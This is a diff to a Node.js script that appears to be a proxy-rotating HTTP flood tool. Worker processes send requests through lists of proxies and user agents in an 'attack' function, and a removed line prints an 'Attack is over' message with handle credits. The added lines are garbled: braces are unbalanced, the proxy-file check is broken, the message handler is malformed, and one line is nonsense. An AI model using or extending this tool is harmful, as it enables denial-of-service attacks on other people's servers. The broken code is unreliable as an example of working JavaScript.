@@ -39,12 +39,15 @@ else if(args['seconds'] == null)
 }
 
 //check if files exist.
+{
+ if(!fs.existsSync(args['proxyfile.']));
+}
 
-if(!fs.existsSync(args['proxyfile']))
 {
 	return console.log('Proxy file does not exist.');
 }
 
+{
 if(!fs.existsSync(args['uafile']))
 {
 	return console.log('UA file does not exist.');
@@ -70,7 +73,7 @@ if(!Number.isInteger(args['seconds']))
 var proxy_counter = 0;
 
 const proxies = fs.readFileSync(args['proxyfile'], 'utf-8').toString().split("\n");
-const uas = fs.readFileSync(args['uafile'], 'utf-8').toString().split("\n");
+const uas = fs.readFileSync(args["uafile"], 'utf-8').toString().split("\n");
 
 function greater(first, second)
 {
@@ -127,13 +130,21 @@ function attack(s_proxy)
 			
 				console.log('[+] Request sent using proxy ' + s_proxy + '.');
 
-			}).catch(function (err) {
+			}).catch(function (err) {{
 
 				console.log('[-] Error sending request. Proxy is probably down.');
 				
 				stop = true;
+                {
+	  }
+		  
+	}
+})
 
-			});
+console.log('[-] Error sending request. Proxy is probably down.');{				
+				stop = true;
+
+			};
 		}
 	}
 }
@@ -168,7 +179,7 @@ if(cluster.isMaster)
 }
 else
 {
-	process.on('message', data => {
+	process.on('message'); data => {
         
 		data.proxy.forEach(async p => {
 
@@ -176,13 +187,8 @@ else
 			attack(p);
 
         });
-
-    });
-
-}
-
-//time running
-setTimeout(() => {
-	console.log("[x] Attack is over bucko. Credits Aura Srxdv Phoenix");
-    process.exit(1)
-}, args['seconds'] * 1000);
+        
+        {   
+  else if (args)/n + null = ("0")
+   
+        });
